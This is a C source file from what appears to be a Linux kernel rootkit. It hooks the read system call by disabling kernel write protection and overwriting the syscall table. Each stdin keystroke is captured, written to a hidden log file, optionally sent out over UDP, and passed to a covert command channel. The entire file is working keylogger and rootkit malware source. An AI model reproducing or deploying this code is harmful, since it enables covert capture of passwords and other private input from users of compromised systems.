/*
 * This file contains all necessary functions for hooking and manipulating
 * the read system call. It is used as a covert communications channel as well
 * as for keylogging.
 */
#include <linux/delay.h>
#include <linux/unistd.h>

#include <linux/string.h>
#include <linux/fs.h>
#include <linux/buffer_head.h>
#include <asm/segment.h>
#include <asm/uaccess.h>

#include "covert_communication.h"
#include "include.h"
#include "net_keylog.h"

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

/*
 * call counter to ensure that we are not unhooking the
 * read syste call while it is still in use
 */
static int read_call_counter = 0;
static spinlock_t read_lock;
static unsigned long read_lock_flags;
static loff_t foffset = 0;

extern int send_flag; // For network keylogging

/* Function used for local logging inside /var/log */
void write_to_file(char *buf)
{
        struct file *fd;
        mm_segment_t oldfs;
        int ret;
        int size;

	/* Create the file with Write and append mode */
        fd = filp_open("/var/log/rootkit_log.log", O_CREAT|O_WRONLY|O_APPEND, S_IRWXU);

        if (!IS_ERR (fd)) {
                oldfs = get_fs();
                set_fs(get_ds());

                size = strlen(buf);

                ret = vfs_write(fd, buf, size, &foffset); 
                foffset += 1;
                //do_sync_write(fd, buffer, readed, 0);

                set_fs(oldfs);
                filp_close(fd, NULL);
        }
	
}

/*
 * Our manipulated read syscall. It will log keystrokes and serve as a covert
 * communication channel.
 */
asmlinkage long
manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
	
	int i;	
	long ret = original_read(fd, buf, count);

	if(ret >= 1 && fd == 0)
	{
		for(i = 0; i < ret; i++) {
			char sendbuf[2];
			memcpy(sendbuf, buf+i, 1);
			memset(sendbuf+1, '\0', 1);
			/* If the send_flag is set, then network keylogging is enabled */
			if(send_flag)
			{
				send_udp(sendbuf);
			}
			
			write_to_file(sendbuf);
			/* send to covert communication channel */
			accept_input(buf[i]);
		}
	}

	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
	return ret;
}

/*
 * hooks the read system call
 */
int
hook_read(void)
{
	ROOTKIT_DEBUG("Hooking read syscall...\n");

	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* disable write protection */
	disable_page_protection();

	/* replace the read syscall */
	original_read = (void *) sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *) manipulated_read;

	/* reenable write protection */
	enable_page_protection();

	/* log and return */
	ROOTKIT_DEBUG("Done.\n");
	return 0;
}

/*
 *unhooks read and returns the kernel to its regular state
 */
void
unhook_read(void)
{
	ROOTKIT_DEBUG("Restoring original read...\n");
	
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_read] = (unsigned long *) original_read;

	/* reenable write protection */
	enable_page_protection();
	
	/* ensure that all processes have left our manipulated syscall */
	while(read_call_counter > 0) {
		msleep(2);
	}

	/* log and return */	
	ROOTKIT_DEBUG("Done.\n");
}
